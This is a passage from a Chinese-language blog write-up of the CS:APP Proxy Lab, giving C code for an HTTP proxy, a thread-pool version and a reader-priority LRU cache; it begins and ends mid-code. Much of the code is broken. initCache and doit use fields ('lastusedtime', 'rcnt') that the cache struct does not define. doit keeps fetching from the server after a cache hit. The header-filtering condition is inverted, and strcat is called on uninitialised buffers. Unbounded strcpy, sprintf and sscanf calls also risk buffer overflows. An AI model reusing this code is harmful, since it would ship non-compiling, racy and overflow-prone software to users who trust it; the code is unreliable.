class="hljs-number">1</span>);<br>    &#125;<br>    signal(SIGPIPE, sigpipe_handler);<br>    listenfd = Open_listenfd(argv[<span class="hljs-number">1</span>]);<br>    <span class="hljs-comment">/* Handle connection */</span><br>    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>)&#123;<br>        clientlen = <span class="hljs-keyword">sizeof</span>(clientaddr);<br>        connfd = Accept(listenfd, (SA *)&amp;clientaddr, &amp;clientlen);<br>        Getnameinfo((SA *)&amp;clientaddr, clientlen, hostname, MAXLINE, port, MAXLINE, <span class="hljs-number">0</span>);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Accepted connection from (%s, %s).\n&quot;</span>, hostname, port);<br>        doit(connfd);<br>        Close(connfd);<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-comment">/* $end main */</span><br></code></pre></td></tr></table></figure><p><code>SIGPIPE</code>处理程序：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * SIGPIPE handler </span><br><span class="hljs-comment"> */</span><br><span class="hljs-comment">/* $begin sigpipe_handler */</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">sigpipe_handler</span><span class="hljs-params">(<span class="hljs-type">int</span> sig)</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;SIGPIPE caught!\n&quot;</span>);<br>    <span class="hljs-keyword">return</span>;<br>&#125;<br><span class="hljs-comment">/* $end sigpipe_handler */</span><br></code></pre></td></tr></table></figure><p>处理一组HTTP请求和响应：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * doit - handle one HTTP request/response transaction</span><br><span class="hljs-comment"> */</span><br><span class="hljs-comment">/* $begin doit */</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">doit</span><span class="hljs-params">(<span class="hljs-type">int</span> connfd)</span><br>&#123;<br>    <span class="hljs-type">char</span> buf[MAXLINE], method[MAXLINE], uri[MAXLINE], version[MAXLINE];<br>    <span class="hljs-type">char</span> server[MAXLINE];<br>    <span class="hljs-type">rio_t</span> rio, server_rio;<br>    <br>    <span class="hljs-comment">/* Read request line and headers */</span><br>    Rio_readinitb(&amp;rio, connfd);<br>    Rio_readlineb(&amp;rio, buf, MAXLINE);<br>    <span class="hljs-built_in">sscanf</span>(buf, <span class="hljs-string">&quot;%s %s %s&quot;</span>, method, uri, version);<br>    <span class="hljs-keyword">if</span> (strcasecmp(method, <span class="hljs-string">&quot;GET&quot;</span>)) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Proxy does not implement this method.\n&quot;</span>);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-comment">/* Parse URI from GET request */</span><br>    parsed_uri *uri_data = (parsed_uri *)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(parsed_uri));<br>    parse_uri(uri, uri_data);<br>    creat_header(server, uri_data, &amp;rio);<br>    <span class="hljs-comment">/* Connect to server */</span><br>    <span class="hljs-type">int</span> serverfd = Open_clientfd(uri_data-&gt;host, uri_data-&gt;port);<br>    <span class="hljs-keyword">if</span> (serverfd &lt; <span class="hljs-number">0</span>)&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;connection failed\n&quot;</span>);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    Rio_readinitb(&amp;server_rio, serverfd);<br>    Rio_writen(serverfd, server, <span class="hljs-built_in">strlen</span>(server));<br>    <span class="hljs-type">size_t</span> n;<br>    <span class="hljs-keyword">while</span> ((n = Rio_readlineb(&amp;server_rio, buf, MAXLINE)))&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Proxy transmitted %d bytes.\n&quot;</span>, (<span class="hljs-type">int</span>)n);<br>        Rio_writen(connfd, buf, n);<br>    &#125;<br>    Close(serverfd);<br>&#125;<br><span class="hljs-comment">/* $end doit */</span><br></code></pre></td></tr></table></figure><p>分析URI：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * parse_uri - parse URI into http://host:port/path</span><br><span class="hljs-comment"> */</span><br><span class="hljs-comment">/* $begin parse_uri */</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">parse_uri</span><span class="hljs-params">(<span class="hljs-type">char</span> *uri, parsed_uri *uri_data)</span><br>&#123;<br>    <span class="hljs-type">char</span> *host = <span class="hljs-built_in">strstr</span>(uri, <span class="hljs-string">&quot;//&quot;</span>);<br>    <span class="hljs-keyword">if</span> (host)&#123;<br>        <span class="hljs-type">char</span> *port = <span class="hljs-built_in">strstr</span>(host + <span class="hljs-number">2</span>, <span class="hljs-string">&quot;:&quot;</span>);<br>        <span class="hljs-keyword">if</span> (port) &#123;<br>            <span class="hljs-type">int</span> tmp;<br>            <span class="hljs-built_in">sscanf</span>(port + <span class="hljs-number">1</span>, <span class="hljs-string">&quot;%d%s&quot;</span>, &amp;tmp, uri_data-&gt;path);<br>            <span class="hljs-built_in">sprintf</span>(uri_data-&gt;port, <span class="hljs-string">&quot;%d&quot;</span>, tmp);<br>            *port = <span class="hljs-string">&#x27;\0&#x27;</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-type">char</span> *path = <span class="hljs-built_in">strstr</span>(host + <span class="hljs-number">2</span>, <span class="hljs-string">&quot;/&quot;</span>);<br>            <span class="hljs-keyword">if</span> (path)&#123;<br>                <span class="hljs-built_in">strcpy</span>(uri_data-&gt;path, path);<br>                <span class="hljs-built_in">strcpy</span>(uri_data-&gt;port, <span class="hljs-string">&quot;80&quot;</span>);<br>                *path = <span class="hljs-string">&#x27;\0&#x27;</span>;<br>            &#125;<br>        &#125;<br>        <span class="hljs-built_in">strcpy</span>(uri_data-&gt;host, host + <span class="hljs-number">2</span>);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-type">char</span> *path = <span class="hljs-built_in">strstr</span>(uri, <span class="hljs-string">&quot;/&quot;</span>);<br>        <span class="hljs-keyword">if</span> (path)<span class="hljs-built_in">strcpy</span>(uri_data-&gt;path, path);<br>        <span class="hljs-built_in">strcpy</span>(uri_data-&gt;port, <span class="hljs-string">&quot;80&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">return</span>;<br>&#125;<br><span class="hljs-comment">/* $end parse_uri */</span><br></code></pre></td></tr></table></figure><p>生成响应头：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * creat_header - create response header</span><br><span class="hljs-comment"> */</span><br><span class="hljs-comment">/* $begin creat_header */</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">creat_header</span><span class="hljs-params">(<span class="hljs-type">char</span> *http_header, parsed_uri *uri_data, <span class="hljs-type">rio_t</span> *client_rio)</span><br>&#123;<br>    <span class="hljs-type">char</span> buf[MAXLINE], request_hdr[MAXLINE], other_hdr[MAXLINE], host_hdr[MAXLINE];<br>    <span class="hljs-built_in">sprintf</span>(request_hdr, req_hdr_format, uri_data-&gt;path);<br>    <span class="hljs-keyword">while</span> (Rio_readlineb(client_rio, buf, MAXLINE) &gt; <span class="hljs-number">0</span>)&#123;<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">strcmp</span>(buf, hdr_end)) <span class="hljs-keyword">break</span>; <br>        <span class="hljs-keyword">if</span> (!strncasecmp(buf, <span class="hljs-string">&quot;Host&quot;</span>, <span class="hljs-built_in">strlen</span>(<span class="hljs-string">&quot;Host&quot;</span>)))&#123;<br>            <span class="hljs-built_in">strcpy</span>(host_hdr, buf);<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br>        <span class="hljs-keyword">if</span> (!strncasecmp(buf, <span class="hljs-string">&quot;Connection&quot;</span>, <span class="hljs-built_in">strlen</span>(<span class="hljs-string">&quot;Connection&quot;</span>)) <br>         &amp;&amp; !strncasecmp(buf, <span class="hljs-string">&quot;Proxy-Connection&quot;</span>, <span class="hljs-built_in">strlen</span>(<span class="hljs-string">&quot;Proxy-Connection&quot;</span>)) <br>         &amp;&amp; !strncasecmp(buf, <span class="hljs-string">&quot;User-Agent&quot;</span>, <span class="hljs-built_in">strlen</span>(<span class="hljs-string">&quot;User-Agent&quot;</span>)))<br>        <span class="hljs-built_in">strcat</span>(other_hdr, buf);<br>    &#125;<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">strlen</span>(host_hdr)) <span class="hljs-built_in">sprintf</span>(host_hdr, host_hdr_format, uri_data-&gt;host);<br>    <span class="hljs-built_in">sprintf</span>(http_header, <span class="hljs-string">&quot;%s%s%s%s%s%s%s&quot;</span>, request_hdr, host_hdr, conn_hdr, proxy_hdr, user_agent_hdr, other_hdr, hdr_end);<br>    <span class="hljs-keyword">return</span>;<br>&#125;<br><span class="hljs-comment">/* $end creat_header */</span><br></code></pre></td></tr></table></figure><h3 id="Part-II"><a href="#Part-II" class="headerlink" title="Part II"></a>Part II</h3><p>在Part I的基础上为代理添加并发支持。</p><p>从<code>sbuf.h</code>引入缓冲区，其中<code>mutex</code>, <code>slots</code>, <code>items</code>初始值分别为1, n, 0：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>    <span class="hljs-type">int</span> *buf;          <span class="hljs-comment">/* Buffer array */</span>         <br>    <span class="hljs-type">int</span> n;             <span class="hljs-comment">/* Maximum number of slots */</span><br>    <span class="hljs-type">int</span> front;         <span class="hljs-comment">/* buf[(front+1)%n] is first item */</span><br>    <span class="hljs-type">int</span> rear;          <span class="hljs-comment">/* buf[rear%n] is last item */</span><br>    <span class="hljs-type">sem_t</span> mutex;       <span class="hljs-comment">/* Protects accesses to buf */</span><br>    <span class="hljs-type">sem_t</span> slots;       <span class="hljs-comment">/* Counts available slots */</span><br>    <span class="hljs-type">sem_t</span> items;       <span class="hljs-comment">/* Counts available items */</span><br>&#125; <span class="hljs-type">sbuf_t</span>;<br></code></pre></td></tr></table></figure><p>定义全局变量<code>sbuf</code>，用作缓冲区：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">sbuf_t</span> sbuf;<br></code></pre></td></tr></table></figure><p>主函数处理连接前创建线程，处理连接时将线程加入缓冲区：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* $begin main */</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv)</span><br>&#123;<br>    <span class="hljs-type">int</span> listenfd, connfd;<br>    <span class="hljs-type">char</span> hostname[MAXLINE], port[MAXLINE];<br>    <span class="hljs-type">socklen_t</span> clientlen;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sockaddr_storage</span> <span class="hljs-title">clientaddr</span>;</span><br>    <span class="hljs-comment">/* Check command line args */</span><br>    <span class="hljs-keyword">if</span> (argc != <span class="hljs-number">2</span>)&#123;<br>        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;usage :%s &lt;port&gt; \n&quot;</span>, argv[<span class="hljs-number">0</span>]);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br>    signal(SIGPIPE, sigpipe_handler);<br>    listenfd = Open_listenfd(argv[<span class="hljs-number">1</span>]);<br>    <span class="hljs-comment">/* Init threads */</span><br>    <span class="hljs-type">pthread_t</span> tid;<br>    sbuf_init(&amp;sbuf, SBUF_SIZE);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;NTHREADS; i+=<span class="hljs-number">1</span>) Pthread_create(&amp;tid, <span class="hljs-literal">NULL</span>, thread, <span class="hljs-literal">NULL</span>);<br>    <span class="hljs-comment">/* Handle connection */</span><br>    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>)&#123;<br>        clientlen = <span class="hljs-keyword">sizeof</span>(clientaddr);<br>        connfd = Accept(listenfd, (SA *)&amp;clientaddr, &amp;clientlen);<br>        sbuf_insert(&amp;sbuf, connfd);<br>        Getnameinfo((SA *)&amp;clientaddr, clientlen, hostname, MAXLINE, port, MAXLINE, <span class="hljs-number">0</span>);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Accepted connection from (%s, %s).\n&quot;</span>, hostname, port);<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-comment">/* $end main */</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * thread - handle threads in sbuf</span><br><span class="hljs-comment"> */</span><br><span class="hljs-comment">/* $begin thread */</span><br><span class="hljs-type">void</span> *<span class="hljs-title function_">thread</span><span class="hljs-params">(<span class="hljs-type">void</span> *vargp)</span><br>&#123;<br>    Pthread_detach(pthread_self());<br>    <span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>)&#123;<br>        <span class="hljs-type">int</span> connfd = sbuf_remove(&amp;sbuf);<br>        doit(connfd);<br>        Close(connfd);<br>    &#125;<br>&#125;<br><span class="hljs-comment">/* $end thread */</span><br></code></pre></td></tr></table></figure><h3 id="Part-III"><a href="#Part-III" class="headerlink" title="Part III"></a>Part III</h3><p>添加缓存并使用LRU算法进行替换，此处缓存应该使用读优先策略。</p><p>缓存的结构如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAX_CACHE 10</span><br><span class="hljs-comment">// Cache structure</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span>&#123;</span><br>    <span class="hljs-type">char</span> obj[MAX_OBJECT_SIZE];<br>    <span class="hljs-type">char</span> uri[MAXLINE];<br>    <span class="hljs-type">int</span> LRU;<br>    <span class="hljs-type">int</span> isEmpty;<br>    <span class="hljs-type">int</span> read_cnt;<br>    <span class="hljs-type">sem_t</span> write_mutex;<br>    <span class="hljs-type">sem_t</span> rcnt_mutex;<br>&#125; block;<br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span>&#123;</span><br>    block data[MAX_CACHE];<br>    <span class="hljs-type">int</span> num;<br>&#125; Cache;<br>Cache cache;<br></code></pre></td></tr></table></figure><p>对缓存初始化，在主函数中调用一次：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * initCache - initialize cache</span><br><span class="hljs-comment"> */</span><br><span class="hljs-comment">/* $begin initCache */</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">initCache</span><span class="hljs-params">()</span><br>&#123;<br>    cache.num = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">int</span> i;<br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; MAX_CACHE; i+=<span class="hljs-number">1</span>)&#123;<br>        cache.data[i].lastusedtime = <span class="hljs-number">0</span>;<br>        cache.data[i].isEmpty = <span class="hljs-number">1</span>;<br>        Sem_init(&amp;cache.data[i].write_mutex, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>);<br>        Sem_init(&amp;cache.data[i].rcnt_mutex, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>);<br>        cache.data[i].read_cnt = <span class="hljs-number">0</span>;<br>    &#125;<br>&#125;<br><span class="hljs-comment">/* $end initCache */</span><br></code></pre></td></tr></table></figure><p>修改<code>doit</code>函数，使得URI在缓存中时从缓存中读取，不在缓存中时连接服务器，将换入的内容写入缓冲区，连接关闭后进行缓存替换：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * doit - handle one HTTP request/response transaction</span><br><span class="hljs-comment"> */</span><br><span class="hljs-comment">/* $begin doit */</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">doit</span><span class="hljs-params">(<span class="hljs-type">int</span> connfd)</span><br>&#123;<br>    <span class="hljs-type">char</span> buf[MAXLINE], method[MAXLINE], uri[MAXLINE], version[MAXLINE];<br>    <span class="hljs-type">char</span> server[MAXLINE];<br>    <span class="hljs-type">char</span> cache_tag[MAXLINE];<br>    <span class="hljs-type">rio_t</span> rio, server_rio;<br>    <br>    <span class="hljs-comment">/* Read request line and headers */</span><br>    Rio_readinitb(&amp;rio, connfd);<br>    Rio_readlineb(&amp;rio, buf, MAXLINE);<br>    <span class="hljs-built_in">sscanf</span>(buf, <span class="hljs-string">&quot;%s %s %s&quot;</span>, method, uri, version);<br>    <span class="hljs-built_in">strcpy</span>(cache_tag,uri);<br>    <span class="hljs-keyword">if</span> (strcasecmp(method, <span class="hljs-string">&quot;GET&quot;</span>)) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Proxy does not implement this method.\n&quot;</span>);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-comment">/* Parse URI from GET request */</span><br>    parsed_uri *uri_data = (parsed_uri *)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(parsed_uri));<br>    <span class="hljs-comment">/* Attempt to get data from cache */</span><br>    <span class="hljs-type">int</span> cache_idx;<br>    <span class="hljs-keyword">if</span>((cache_idx=getCache(cache_tag))!=<span class="hljs-number">-1</span>)&#123;<br>        <span class="hljs-comment">// Lock&amp;update read_cnt</span><br>        P(&amp;cache.data[cache_idx].rcnt_mutex);<br>        cache.data[cache_idx].rcnt+=<span class="hljs-number">1</span>;<br>        <span class="hljs-comment">// Lock write_mutex</span><br>        <span class="hljs-keyword">if</span>(cache.data[cache_idx].rcnt==<span class="hljs-number">1</span>)P(&amp;cache.data[cache_idx].write_mutex);<br>        <span class="hljs-comment">// Unlock read_cnt</span><br>        V(&amp;cache.data[cache_idx].rcnt_mutex);<br><br>        Rio_writen(connfd, cache.data[cache_idx].obj, <span class="hljs-built_in">strlen</span>(cache.data[cache_idx].obj));<br><br>        <span class="hljs-comment">// Lock&amp;update read_cnt</span><br>        P(&amp;cache.data[cache_idx].rcnt_mutex);<br>        cache.data[cache_idx].rcnt-=<span class="hljs-number">1</span>;<br>        <span class="hljs-comment">// Unlock write_mutex</span><br>        <span class="hljs-keyword">if</span>(cache.data[cache_idx].rcnt==<span class="hljs-number">0</span>)V(&amp;cache.data[cache_idx].write_mutex);<br>        <span class="hljs-comment">// Unlock read_cnt</span><br>        V(&amp;cache.data[cache_idx].rcnt_mutex);<br>    &#125;<br>    parse_uri(uri, uri_data);<br>    creat_header(server, uri_data, &amp;rio);<br>    <span class="hljs-comment">/* Connect to server */</span><br>    <span class="hljs-type">int</span> serverfd = Open_clientfd(uri_data-&gt;host, uri_data-&gt;port);<br>    <span class="hljs-keyword">if</span> (serverfd &lt; <span class="hljs-number">0</span>)&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;connection failed\n&quot;</span>);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    Rio_readinitb(&amp;server_rio, serverfd);<br>    Rio_writen(serverfd, server, <span class="hljs-built_in">strlen</span>(server));<br>    <span class="hljs-comment">/* Update cache */</span><br>    <span class="hljs-type">char</span> cache_buf[MAX_OBJECT_SIZE];<br>    <span class="hljs-type">int</span> size_buf = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">size_t</span> n;<br>    <span class="hljs-keyword">while</span> ((n = Rio_readlineb(&amp;server_rio, buf, MAXLINE)))&#123;<br>        size_buf += n;<br>        <span class="hljs-keyword">if</span>(size_buf &lt; MAX_OBJECT_SIZE)<span class="hljs-built_in">strcat</span>(cache_buf, buf);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Proxy transmitted %d bytes.\n&quot;</span>, (<span class="hljs-type">int</span>)n);<br>        Rio_writen(connfd, buf, n);<br>    &#125;<br>    Close(serverfd);<br>    <span class="hljs-keyword">if</span>(size_buf &lt; MAX_OBJECT_SIZE)writeCache(cache_tag, cache_buf);<br>&#125;<br><span class="hljs-comment">/* $end doit */</span><br></code></pre></td></tr></table></figure><p>读写缓存操作：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * getCache - fetch data from cache</span><br><span class="hljs-comment"> */</span><br><span class="hljs-comment">/* $begin getCache */</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">getCache</span><span class="hljs-params">(<span class="hljs-type">char</span> *url)</span><br>&#123;<br>    <span class="hljs-type">int</span> i;<br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; MAX_CACHE; i+=<span class="hljs-number">1</span>)&#123;<br>        <span class="hljs-comment">// Lock&amp;update read_cnt, lock write_mutex</span><br>        P(&amp;cache.data[i].rcnt_mutex);<br>        cache.data[i].read_cnt+=<span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">if</span> (cache.data[i].read_cnt == <span class="hljs-number">1</span>) P(&amp;cache.data[i].write_mutex);<br>        V(&amp;cache.data[i].rcnt_mutex);<br>        <span class="hljs-comment">// Found data</span><br>        <span class="hljs-keyword">if</span> (!cache.data[i].isEmpty &amp;&amp; !<span class="hljs-built_in">strcmp</span>(url, cache.data[i].uri))<span class="hljs-keyword">break</span>;<br>        <span class="hljs-comment">// Lock&amp;update read_cnt, unlock write_mutex</span><br>        P(&amp;cache.data[i].rcnt_mutex);<br>        cache.data[i].read_cnt-=<span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">if</span> (cache.data[i].read_cnt == <span class="hljs-number">0</span>) V(&amp;cache.data[i].write_mutex);<br>        V(&amp;cache.data[i].rcnt_mutex);<br>    &#125;<br>    <span class="hljs-keyword">if</span> (i &gt;= MAX_CACHE) <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    <span class="hljs-keyword">return</span> i;<br>&#125;<br><span class="hljs-comment">/* $end getCache */</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * writeCache - fetch data from cache</span><br><span class="hljs-comment"> */</span><br><span class="hljs-comment">/* $begin writeCache */</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">writeCache</span><span class="hljs-params">(<span class="hljs-type">char</span> *uri, <span class="hljs-type">char</span> *buf)</span><br>&#123;<br>    <span class="hljs-type">int</span> i = getIndex();<br>    P(&amp;cache.data[i].write_mutex);<br>    <span class="hljs-built_in">strcpy</span>(cache.data[i].obj, buf);<br>    <span class="hljs-built_in">strcpy</span>(cache.data[i].uri, uri);<br>    